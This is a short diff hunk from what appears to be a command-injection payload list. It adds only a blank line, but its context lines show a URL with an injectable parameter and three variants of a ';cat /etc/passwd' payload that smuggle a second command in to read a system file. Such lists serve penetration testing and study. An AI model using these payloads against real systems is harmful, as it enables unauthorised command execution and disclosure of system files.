@@ -62,3 +62,4 @@ http://sensitive/something.php?dir=???
 - %3Bcat%20/etc/passwd
 - ;cat /etc/passwd
 - ;$bash% cat /etc/passwd
+ 
